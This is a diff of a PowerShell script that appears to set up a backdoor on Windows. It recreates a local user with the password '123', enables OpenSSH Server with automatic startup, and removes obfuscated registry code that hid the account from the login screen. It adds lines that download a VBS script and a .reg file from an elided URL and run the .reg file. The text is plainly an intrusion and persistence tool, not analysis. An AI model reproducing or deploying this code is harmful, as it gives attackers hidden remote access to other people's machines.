@@ -31,13 +31,11 @@ $passwd = "123"
 Remove-LocalUser -Name $uname
 $passSec = (ConvertTo-SecureString $passwd -AsPlainText -Force)
 Create_User -uname $uname -passwd $passwd
-
-$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
-$jmQikqoKMZ = '00000000'
-New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
-New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
-New-ItemProperty -Path $csfMFzvgEN -Name $uname -Value $jmQikqoKMZ -PropertyType DWORD -Force
-
+$vbs_script = random_text
+$reg = random_text
+Invoke-WebRequest -Uri ... -OutFile "$vbs_script.vbs"
+Invoke-WebRequest -Uri ... -OutFile "$reg.reg" 
+.\reg.reg
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
